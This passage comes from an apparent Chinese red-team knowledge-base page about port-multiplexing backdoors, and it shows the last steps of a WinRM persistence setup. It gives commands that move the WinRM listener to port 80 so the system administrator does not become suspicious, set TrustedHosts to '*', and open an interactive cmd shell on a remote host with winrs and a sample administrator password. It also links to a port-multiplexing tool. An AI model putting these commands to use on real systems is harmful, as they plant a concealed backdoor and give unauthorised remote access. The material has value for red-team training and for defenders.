</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><p><strong>3、Server 2008配置，修改WinRM端口</strong></p> <p>对于原本未开放WinRM服务的机器（Server 2008），需要把新开的<strong>5985</strong>端口修改至80端口，避免引起系统管理员怀疑</p> <div class="language-bash line-numbers-mode"><pre class="language-bash"><code>winrm <span class="token builtin class-name">set</span> winrm/config/Listener?Address<span class="token operator">=</span>*+Transport<span class="token operator">=</span>HTTP @<span class="token punctuation">{</span>Port<span class="token operator">=</span><span class="token string">&quot;80&quot;</span><span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p><strong>4、后门连接</strong></p> <p>首先开启本机WinRM服务，然后设置信任连接的主机</p> <div class="language-bash line-numbers-mode"><pre class="language-bash"><code>winrm quickconfig -q 	<span class="token comment"># 开启服务</span>
winrm <span class="token builtin class-name">set</span> winrm/config/Client @<span class="token punctuation">{</span>TrustedHosts<span class="token operator">=</span><span class="token string">&quot;*&quot;</span><span class="token punctuation">}</span>  <span class="token comment"># 设置信任连接的主机</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p>执行使用winrs命令连接远程WinRM服务，获取交互shell</p> <div class="language-bash line-numbers-mode"><pre class="language-bash"><code>winrs -r:http://www.baidu.com -u:administrator -p:P@ssw0rd cmd
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><hr> <p>端口复用相关工具： https://github.com/Heart-Sky/port-multiplexing</p> <h1 id="参考连接">参考连接 <a href="#参考连接" class="header-anchor">#</a></h1> <p><a href="https://www.cnblogs.com/0x4D75/p/11381449.html#%E4%B8%80-%E7%AB%AF%E5%8F%A3%E5%A4%8D%E7%94%A8" target="_blank" rel="noopener noreferrer">端口复用后门 - 0x4D75 - 博客园<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></p></div> <footer class="page-edit"><!----> <div class="last-updated"><span class="prefix">上次更新:</span> <span class="time">10/31/2020, 8:51:08 AM</span></div></footer> <div class="page-nav"><p class="inner"><span class="prev"><a href="/./knowledge/hw/checklist.html" class="prev"><i aria-label="icon: left" class="anticon anticon-left"><svg viewBox="64 64 896 896" focusable="false" data-icon="left" width="1em" height="1em" fill="currentColor" aria-hidden="true"><path d="M724 218.3V141c0-6.7-7.7-10.4-12.9-6.3L260.3 486.8a31.86 31.86 0 0 0 0 50.3l450.8 352.1c5.3 4.1 12.9.4 12.9-6.3v-77.3c0-4.9-2.3-9.6-6.1-12.6l-360-281 360-281.1c3.8-3 6.1-7.7 6.1-12.6z"></path></svg></i>
        【红队】常规Web打点-漏洞挖掘
      </a></span> <span class="next"><a href="/./knowledge/hw/webshell.html">
        【红队】权限维持之--WebShell
        <i aria-label="icon: right" class="anticon anticon-right"><svg viewBox="64 64 896 896" focusable="false" data-icon="right" width="1em" height="1em" fill="currentColor" aria-hidden="true"><path d="M765.7 486.8L314.9 134.7A7.97 7.97 0 0 0 302 141v77.3c0 4.9 2.3 9.6 6.1 12.6l360 281.1-360 281.1c-3.9 3-6.1 7.7-6.1 12.6V883c0 6.7 7.7 10.4 12.9 6.3l450.8-352.1a31.96 31.96 0 0 0 0-50.4z"></path></svg></i></a></span></p></div> </main> <!----></div><div class="global-ui"></div></div>
    <script src="./assets/js/app.5fb053b1.js" defer></script><script src="./assets/js/2.94dca18c.js" defer></script><script src="./assets/js/34.d5f8ba65.js" defer></script>
  </body>
</html>